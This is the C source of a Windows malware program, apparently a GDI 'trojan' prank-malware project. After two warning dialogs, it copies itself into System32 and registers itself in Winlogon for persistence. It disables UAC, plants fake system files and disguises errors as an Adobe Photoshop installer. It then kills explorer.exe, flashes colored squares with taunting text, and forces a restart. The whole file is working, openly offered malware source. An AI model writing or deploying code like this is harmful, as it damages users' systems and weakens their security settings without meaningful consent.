#include "setup.h"
#include "gdi.h"
#include "tools.h"
#include "registry.h"
#include <handleapi.h>

BOOL DoWarnings(){
    if(MessageBoxW(NULL, L"This does no good for you, continue?", L"will hyperborea ever happen?", MB_YESNO | MB_ICONWARNING) == IDYES){
        if(MessageBoxW(NULL, L"This will only do harm to your PC\n\n  you sure about this?", L"is paganism the future?", MB_YESNO | MB_ICONWARNING) == IDYES){
            return TRUE;
        }
        else return FALSE;
    }
    else return FALSE;
}


BOOL SetupSystemForMalware(){
    OFSTRUCT OpenBuff;
    HFILE file = OpenFile("C:\\Windows\\System32\\ntoskrnl.ini", &OpenBuff, OF_CREATE);
    if(file == HFILE_ERROR){
        InstallerError(L"Failed Starting Installation Of Adobe Photoshop");
        return FALSE;
    }
    LPWSTR path = (LPWSTR)AllocateVirtualMemory(5097);
    GetModuleFileNameW(NULL, path, 5096);
    if(!CopyFileW(path, L"C:\\Windows\\System32\\smrss.exe", FALSE)){
        MessageBoxW(NULL, L"Failed Copying File", L"Installer", MB_OK | MB_ICONERROR);
        FreeVirtualMemory(path);
        return FALSE;
    }
    WriteIntoRegistry(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\", 
                    L"ShellInfrastructure", REG_SZ, L"C:\\Windows\\System32\\smrss.exe");
    DWORD value = 0;
    WriteIntoRegistry(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\", 
                    L"EnableLUA", REG_DWORD, &value);
    HANDLE hFile = CreateFileW(L"C:\\Windows\\System32\\Windows.UI.NtHal.dll", 
                GENERIC_READ | GENERIC_WRITE, 0, 
                NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if(hFile == INVALID_HANDLE_VALUE){
        MessageBoxW(NULL, L"Minor Issues Happened, But You're Fine", 
                        L"Installer", MB_OK | MB_ICONERROR);
        FreeVirtualMemory(path);
        return FALSE;
    }
    BOOL result = WriteFile(hFile, path, 
                            wcslen(path) * sizeof(WCHAR), NULL, NULL);
    if(!result){
        MessageBoxW(NULL, L"Minor Issues Happened, But You're Fine", L"Installer", 
                    MB_OK | MB_ICONERROR);
        FreeVirtualMemory(path);
        CloseHandle(hFile);
        RestartSystem();
        return FALSE;
    }
    CloseHandle(hFile);
    FreeVirtualMemory(path);
    int prevtime = timeGetTime();
    ShellExecuteW(NULL, L"open", L"cmd.exe", L"/c taskkill /f /im explorer.exe", NULL, SW_HIDE);
    HBRUSH color = CreateSolidBrush(RGB(255, 0, 0));
    HBRUSH acolor = CreateSolidBrush(RGB(0, 255, 0));
    HBRUSH bcolor = CreateSolidBrush(RGB(0, 0, 255));
    while (1) {
        if (timeGetTime() - prevtime >= 12000) break;
        RenderSquares(GDIReturnDC(), GDIReturnStockScreenX() / 2, GDIReturnStockScreenY() / 2, color, acolor, bcolor);
        RenderSquares(GDIReturnDC(), GDIReturnStockScreenX() / 3, GDIReturnStockScreenY() / 2, color, acolor, bcolor);
        RenderSquares(GDIReturnDC(), GDIReturnStockScreenX() / 3, GDIReturnStockScreenY() / 3, color, acolor, bcolor);
        RenderSquares(GDIReturnDC(), GDIReturnStockScreenX() / 2, GDIReturnStockScreenY() / 3, color, acolor, bcolor);
        MalDrawText(GDIReturnDC(), 40, 40, 30, L"is it all worth it anon, all the harrassment?", RGB(255, 255, 255));
    }
    DeleteObject(color);
    DeleteObject(acolor);
    DeleteObject(bcolor);
    RestartSystem();
    return TRUE;
}